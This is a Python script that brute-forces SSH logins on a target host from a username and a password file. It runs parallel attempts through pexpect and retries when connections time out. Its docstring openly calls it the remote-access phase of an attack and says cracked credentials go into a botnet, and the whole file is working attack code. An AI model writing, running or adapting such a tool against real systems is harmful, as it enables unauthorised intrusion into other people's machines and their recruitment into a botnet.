import argparse, threading, time
from pexpect import pxssh

'''
With recon complete and open access ports found we can move to the second phase of the attack. Gaining remote access.

With access to a the host IP, root username and text file off password keys we can attempt to brute force our way in

Once we find the user password pair we can add it to our botnet
'''

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0


# connect function tests found username with one of the passwords in the text file
def connect(host, user, password, release=True):
    
    global Found
    global Fails

# pexpect library used for easy ssh interaction/listening
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        # add data to the botnet
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


# potentially weave this into the botnet file??????
if __name__ == '__main__':

    parser = argparse.ArgumentParser(usage='python3 MW_ssh_brute.py TARGET_HOST -u USERNAME -f PASSWORD_FILE')
    parser.add_argument('host', type=str, metavar='TARGET_HOST', help="specify target host's IP address")
    parser.add_argument('-un', type=str, metavar='USERNAME', required=True, help='specify the user name')
    parser.add_argument('-pf', type=str, metavar='PASSWORD_FILE', required=True, help='specify password file name')

    args = parser.parse_args()
    host = args.host
    user = args.un
    password_file = args.pf


    with open(password_file) as file:
        
        for line in file.readlines():
            
            if Found:
                print("[*] Exiting: Password Found")
                exit(0)
            
            if Fails > 5:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(0)
            
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print("[-] Testing: " + str(password))
            t = threading.Thread(target=connect, args=(host, user, password))
            t.start()